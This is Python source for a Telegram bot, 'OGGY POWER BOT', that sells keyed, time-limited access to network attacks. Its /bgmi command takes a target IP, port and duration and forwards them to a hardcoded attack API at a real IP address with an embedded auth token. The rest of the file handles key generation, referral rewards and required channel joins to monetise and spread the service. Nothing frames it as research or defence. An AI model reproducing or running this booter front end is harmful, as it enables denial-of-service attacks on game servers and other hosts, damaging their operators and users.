import telebot
import json
import requests
import datetime
import os
import time
import psutil
import socket
import threading
import random
import string

# - Load Config (Admin ID aur Token)
if os.path.exists('config.json'):
    with open('config.json') as f:
        config = json.load(f)
else:
    print("Error: config.json file nahi mili!")
    print("Sample config.json:")
    print('{"token": "YOUR_BOT_TOKEN", "admin": "YOUR_ADMIN_ID"}')
    exit()

bot = telebot.TeleBot(config['token'])
API_URL = "http://34.126.208.96:8080/hit" 
AUTH_TOKEN = "DRX_POWER_ULTRA_V4"

# Database files
KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
REFERRAL_FILE = "referrals.json"
CHANNELS_FILE = "channels.json"

# Channel join required (Add your channel usernames without @)
REQUIRED_CHANNELS = config.get('channels', [])  # Add channels in config.json

def load_data(file):
    if os.path.exists(file):
        with open(file, 'r') as f: return json.load(f)
    return {}

def save_data(file, data):
    with open(file, 'w') as f: json.dump(data, f, indent=4)

def check_channels(user_id):
    """Check if user has joined all required channels"""
    if not REQUIRED_CHANNELS:
        return True, []
    
    not_joined = []
    for channel in REQUIRED_CHANNELS:
        try:
            # Remove @ if present
            channel_username = channel.replace('@', '')
            member_status = bot.get_chat_member(f"@{channel_username}", user_id).status
            if member_status in ['left', 'kicked']:
                not_joined.append(channel)
        except:
            not_joined.append(channel)
    
    return len(not_joined) == 0, not_joined

def generate_oggy_key(duration, custom_name=None):
    """Generate OGGY style key"""
    if custom_name:
        prefix = custom_name.upper()
    else:
        prefix = "OGGY"
    
    # Generate random suffix
    suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    key = f"{prefix}-{suffix}"
    
    keys = load_data(KEYS_FILE)
    keys[key] = {
        "duration": duration,
        "created_by": "admin",
        "created_at": datetime.datetime.now().isoformat(),
        "used_by": None
    }
    save_data(KEYS_FILE, keys)
    return key

# - Commands Logic
@bot.message_handler(commands=['start'])
def welcome(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    joined, not_joined = check_channels(user_id)
    
    if not joined:
        channels_text = "\n".join([f"• @{ch.replace('@', '')}" for ch in not_joined])
        keyboard = telebot.types.InlineKeyboardMarkup()
        
        for channel in not_joined:
            btn = telebot.types.InlineKeyboardButton(
                f"📢 Join {channel}", 
                url=f"https://t.me/{channel.replace('@', '')}"
            )
            keyboard.add(btn)
        
        btn_check = telebot.types.InlineKeyboardButton("✅ Check Joined", callback_data="check_join")
        keyboard.add(btn_check)
        
        bot.reply_to(
            m, 
            f"🔥 **WELCOME TO OGGY POWER BOT** 🔥\n\n"
            f"❌ **Access Denied!**\n\n"
            f"Please join these channels first:\n{channels_text}\n\n"
            f"After joining, click the check button.",
            reply_markup=keyboard,
            parse_mode="Markdown"
        )
        return
    
    # Check if user has active plan
    users = load_data(USERS_FILE)
    if user_id in users and users[user_id].get('active'):
        plan_expiry = users[user_id].get('expiry')
        if plan_expiry and datetime.datetime.now().isoformat() < plan_expiry:
            bot.reply_to(
                m,
                f"🔥 **OGGY POWER BOT ACTIVE** 🔥\n\n"
                f"✅ Welcome back!\n"
                f"📅 Plan expires: {users[user_id]['plan']}\n\n"
                f"Use /help to see commands."
            )
            return
    
    # New user or expired plan
    bot.reply_to(
        m,
        f"🔥 **OGGY POWER BOT** 🔥\n\n"
        f"Welcome @{m.from_user.username or m.from_user.first_name}!\n\n"
        f"📌 **How to get access:**\n"
        f"1️⃣ Use /redeem with a valid key\n"
        f"2️⃣ Get 3 referrals using /referral\n"
        f"3️⃣ Or purchase from admin\n\n"
        f"Use /help for commands."
    )

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def check_join_callback(call):
    user_id = call.from_user.id
    joined, not_joined = check_channels(user_id)
    
    if joined:
        bot.edit_message_text(
            "✅ **Channel verification passed!**\nYou can now use the bot.",
            call.message.chat.id,
            call.message.message_id
        )
        welcome(call.message)
    else:
        channels_text = "\n".join([f"• @{ch.replace('@', '')}" for ch in not_joined])
        bot.answer_callback_query(
            call.id, 
            f"Please join: {', '.join(not_joined)}", 
            show_alert=True
        )

@bot.message_handler(commands=['help'])
def help_cmd(m):
    user_id = str(m.from_user.id)
    
    # Check channel join first
    joined, _ = check_channels(user_id)
    if not joined:
        return bot.reply_to(m, "❌ Please join required channels first! Use /start")
    
    help_text = """
🚀 **OGGY POWER BOT COMMANDS** 🚀

**Attack Commands:**
/bgmi <ip> <port> <time> - Start OGGY Attack

**Account Commands:**
/redeem <key> - Activate your plan
/myinfo - Check your plan details
/referral - Get referral link & track
/status - Bot & API status

**OGGY Special Features:**
• Custom OGGY style keys
• Referral system (3 referrals = 2 hours free)
• Channel join protection
• High power attacks

💎 **Need Key?** Contact @admin
    """
    bot.reply_to(m, help_text, parse_mode="Markdown")

@bot.message_handler(commands=['genkey'])
def genkey(m):
    if str(m.from_user.id) != str(config['admin']):
        return bot.reply_to(m, "❌ Admin only command.")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /genkey <duration> [custom_name]\n\nExamples:\n/genkey 2h\n/genkey 1d OGGY-PRO\n/genkey 30min VIP")
    
    duration = args[1]
    custom_name = args[2] if len(args) > 2 else None
    
    key = generate_oggy_key(duration, custom_name)
    bot.reply_to(
        m, 
        f"🔑 **OGGY KEY GENERATED** 🔑\n\n"
        f"Key: `{key}`\n"
        f"Duration: {duration}\n"
        f"Style: OGGY Custom\n\n"
        f"Share this key with users!"
    )

@bot.message_handler(commands=['redeem'])
def redeem(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    joined, not_joined = check_channels(user_id)
    if not joined:
        channels_text = "\n".join([f"• @{ch.replace('@', '')}" for ch in not_joined])
        return bot.reply_to(m, f"❌ Please join required channels first:\n{channels_text}")
    
    args = m.text.split()
    if len(args) < 2:
        return bot.reply_to(m, "Usage: /redeem OGGY-XXXXXX")
    
    user_key = args[1].upper()
    keys = load_data(KEYS_FILE)
    
    if user_key in keys:
        key_data = keys[user_key]
        
        # Check if key already used
        if key_data.get('used_by'):
            return bot.reply_to(m, "❌ This key has already been used!")
        
        duration = key_data['duration']
        users = load_data(USERS_FILE)
        
        # Calculate expiry
        now = datetime.datetime.now()
        if 'h' in duration:
            hours = int(duration.replace('h', ''))
            expiry = now + datetime.timedelta(hours=hours)
        elif 'd' in duration:
            days = int(duration.replace('d', ''))
            expiry = now + datetime.timedelta(days=days)
        elif 'min' in duration:
            mins = int(duration.replace('min', ''))
            expiry = now + datetime.timedelta(minutes=mins)
        else:
            expiry = now + datetime.timedelta(hours=1)
        
        users[user_id] = {
            "plan": duration,
            "active": True,
            "redeemed_at": now.isoformat(),
            "expiry": expiry.isoformat(),
            "used_key": user_key
        }
        save_data(USERS_FILE, users)
        
        # Mark key as used
        key_data['used_by'] = user_id
        key_data['used_at'] = now.isoformat()
        keys[user_key] = key_data
        save_data(KEYS_FILE, keys)
        
        bot.reply_to(
            m, 
            f"✅ **OGGY KEY REDEEMED!** ✅\n\n"
            f"🎉 Plan Activated: {duration}\n"
            f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔥 Start attacking with /bgmi"
        )
    else:
        bot.reply_to(m, "❌ Invalid OGGY Key!\n\nUse /genkey to create valid keys (admin only)")

@bot.message_handler(commands=['referral'])
def referral_cmd(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    joined, _ = check_channels(user_id)
    if not joined:
        return bot.reply_to(m, "❌ Please join required channels first! Use /start")
    
    referrals = load_data(REFERRAL_FILE)
    bot_username = bot.get_me().username
    
    # Initialize user referral data
    if user_id not in referrals:
        referrals[user_id] = {
            "code": f"OGGY{user_id[-6:]}",
            "referrals_count": 0,
            "referred_users": [],
            "reward_claimed": False
        }
        save_data(REFERRAL_FILE, referrals)
    
    user_ref = referrals[user_id]
    referral_link = f"https://t.me/{bot_username}?start=ref_{user_ref['code']}"
    
    # Check if user can claim reward
    can_claim = user_ref['referrals_count'] >= 3 and not user_ref['reward_claimed']
    
    ref_text = (
        f"🔗 **OGGY REFERRAL SYSTEM** 🔗\n\n"
        f"👤 Your Referral Code: `{user_ref['code']}`\n"
        f"📊 Referrals: {user_ref['referrals_count']}/3\n"
        f"✅ Reward Claimed: {'Yes' if user_ref['reward_claimed'] else 'No'}\n\n"
        f"🔗 **Your Referral Link:**\n"
        f"`{referral_link}`\n\n"
        f"🎁 **Reward:** Get 3 referrals = 2 hours FREE access!\n\n"
        f"💡 Share your link with friends!\n"
    )
    
    keyboard = telebot.types.InlineKeyboardMarkup()
    if can_claim:
        claim_btn = telebot.types.InlineKeyboardButton("🎁 Claim Reward (2 Hours)", callback_data="claim_reward")
        keyboard.add(claim_btn)
    
    bot.reply_to(m, ref_text, reply_markup=keyboard if can_claim else None)

@bot.callback_query_handler(func=lambda call: call.data == "claim_reward")
def claim_reward(call):
    user_id = str(call.from_user.id)
    referrals = load_data(REFERRAL_FILE)
    
    if user_id not in referrals:
        return bot.answer_callback_query(call.id, "Error: No referral data found!")
    
    user_ref = referrals[user_id]
    
    if user_ref['referrals_count'] >= 3 and not user_ref['reward_claimed']:
        # Grant 2 hours free access
        users = load_data(USERS_FILE)
        now = datetime.datetime.now()
        expiry = now + datetime.timedelta(hours=2)
        
        users[user_id] = {
            "plan": "2 hours (Referral Reward)",
            "active": True,
            "redeemed_at": now.isoformat(),
            "expiry": expiry.isoformat(),
            "source": "referral"
        }
        save_data(USERS_FILE, users)
        
        # Mark reward as claimed
        user_ref['reward_claimed'] = True
        referrals[user_id] = user_ref
        save_data(REFERRAL_FILE, referrals)
        
        bot.edit_message_text(
            f"🎉 **REWARD CLAIMED!** 🎉\n\n"
            f"✅ 2 hours of FREE access activated!\n"
            f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"🔥 Use /bgmi to start attacking!",
            call.message.chat.id,
            call.message.message_id
        )
    else:
        bot.answer_callback_query(call.id, "You don't have enough referrals yet! Need 3 referrals.")

@bot.message_handler(commands=['start'], func=lambda m: m.text and 'ref_' in m.text)
def handle_referral_start(m):
    # Extract referral code
    ref_code = m.text.split('ref_')[1]
    referrer_id = None
    
    # Find who has this referral code
    referrals = load_data(REFERRAL_FILE)
    for uid, data in referrals.items():
        if data['code'] == ref_code:
            referrer_id = uid
            break
    
    new_user_id = str(m.from_user.id)
    
    # Check channel join for new user
    joined, not_joined = check_channels(new_user_id)
    if not joined:
        channels_text = "\n".join([f"• @{ch.replace('@', '')}" for ch in not_joined])
        return bot.reply_to(m, f"❌ Please join required channels first:\n{channels_text}")
    
    # Add referral if valid and not self-referral
    if referrer_id and referrer_id != new_user_id:
        if new_user_id not in referrals[referrer_id]['referred_users']:
            referrals[referrer_id]['referrals_count'] += 1
            referrals[referrer_id]['referred_users'].append(new_user_id)
            save_data(REFERRAL_FILE, referrals)
            
            # Notify referrer
            try:
                bot.send_message(
                    int(referrer_id),
                    f"🎉 **New Referral!**\n\n"
                    f"Someone joined using your link!\n"
                    f"Total referrals: {referrals[referrer_id]['referrals_count']}/3\n"
                    f"Use /referral to claim your reward when you reach 3!"
                )
            except:
                pass
    
    # Continue with normal start
    welcome(m)

@bot.message_handler(commands=['bgmi'])
def attack(m):
    users = load_data(USERS_FILE) 
    user_id = str(m.from_user.id)
    
    # Check channel join
    joined, not_joined = check_channels(user_id)
    if not joined:
        channels_text = "\n".join([f"• @{ch.replace('@', '')}" for ch in not_joined])
        return bot.reply_to(m, f"❌ Please join required channels first:\n{channels_text}")
    
    if user_id not in users or not users[user_id].get('active'):
        return bot.reply_to(
            m, 
            "❌ **ACCESS DENIED!**\n\n"
            "No active plan found.\n\n"
            "🔑 Use /redeem with a valid key\n"
            "👥 Or get 3 referrals with /referral\n"
            "💰 Or contact admin to purchase"
        )
    
    # Check expiry
    expiry_str = users[user_id].get('expiry')
    if expiry_str:
        expiry = datetime.datetime.fromisoformat(expiry_str)
        if datetime.datetime.now() > expiry:
            users[user_id]['active'] = False
            save_data(USERS_FILE, users)
            return bot.reply_to(m, "❌ Your plan has expired! Use /redeem for new key.")
    
    args = m.text.split()
    if len(args) != 4: 
        return bot.reply_to(m, "❌ **Format:** `/bgmi <IP> <PORT> <TIME>`\nExample: `/bgmi 127.0.0.1 8080 60`")
    
    ip, port, attack_time = args[1], args[2], args[3]
    
    try:
        response = requests.get(f"{API_URL}?token={AUTH_TOKEN}&ip={ip}&port={port}&time={attack_time}", timeout=10)
        
        if response.status_code == 200:
            bot.reply_to(
                m, 
                f"🔥 **OGGY ATTACK STARTED!** 🔥\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"🎯 Target: `{ip}:{port}`\n"
                f"🕒 Time: {attack_time}s\n"
                f"💎 Power: OGGY ULTRA\n"
                f"👑 Mode: DESTROYER\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"✅ Attack is in progress!"
            )
            
            def send_finish():
                bot.send_message(
                    m.chat.id, 
                    f"✅ **OGGY ATTACK FINISHED** ✅\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"🎯 Target: `{ip}:{port}`\n"
                    f"💥 Status: Target Neutralized\n"
                    f"━━━━━━━━━━━━━━━━━━━━"
                )
            
            threading.Timer(int(attack_time), send_finish).start()
        else:
            bot.reply_to(m, "❌ **API ERROR!**\nServer responded with an error.")
            
    except Exception as e:
        bot.reply_to(m, "❌ **CONNECTION ERROR!**\nAPI server is offline. Contact admin.")

@bot.message_handler(commands=['myinfo'])
def myinfo(m):
    user_id = str(m.from_user.id)
    
    # Check channel join
    joined, _ = check_channels(user_id)
    if not joined:
        return bot.reply_to(m, "❌ Please join required channels first! Use /start")
    
    users = load_data(USERS_FILE)
    if user_id in users and users[user_id].get('active'):
        expiry_str = users[user_id].get('expiry')
        if expiry_str:
            expiry = datetime.datetime.fromisoformat(expiry_str)
            remaining = expiry - datetime.datetime.now()
            hours_left = remaining.total_seconds() / 3600
            
            bot.reply_to(
                m, 
                f"👤 **OGGY USER INFO**\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📋 Plan: {users[user_id]['plan']}\n"
                f"⏰ Status: Active ✅\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}\n"
                f"⌛ Time Left: {hours_left:.1f} hours\n"
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"💪 Keep attacking with /bgmi"
            )
        else:
            bot.reply_to(m, f"👤 Plan: {users[user_id]['plan']}\nStatus: Active ✅")
    else:
        bot.reply_to(m, "❌ No active plan found.\nUse /redeem or /referral")

@bot.message_handler(commands=['status'])
def status(m):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(2)
    try:
        s.connect(('127.0.0.1', 8080))
        api_status = "Online 🟢"
        s.close()
    except:
        api_status = "Offline 🔴"

    cpu_usage = psutil.cpu_percent(interval=1)
    ram_usage = psutil.virtual_memory().percent
    load_icon = "🟢" if cpu_usage < 50 else "🟡" if cpu_usage < 80 else "🔴"
    
    # Count active users
    users = load_data(USERS_FILE)
    active_users = sum(1 for u in users.values() if u.get('active', False))
    
    status_text = (
        "🔥 **OGGY POWER STATUS** 🔥\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"🤖 Bot Name: OGGY POWER\n"
        f"🔌 API Status: {api_status}\n"
        f"👥 Active Users: {active_users}\n"
        f"🖥️ CPU Load: {cpu_usage}% {load_icon}\n"
        f"💾 RAM Usage: {ram_usage}%\n"
        f"🚀 Server: ULTRA OPTIMIZED\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        f"💎 OGGY MODE: DESTROYER"
    )
    bot.reply_to(m, status_text, parse_mode="Markdown")

print("🔥 OGGY POWER BOT STARTED 🔥")
print(f"Bot Username: @{bot.get_me().username}")
print("Features: OGGY Keys | Referral System | Channel Protection")
bot.polling(none_stop=True)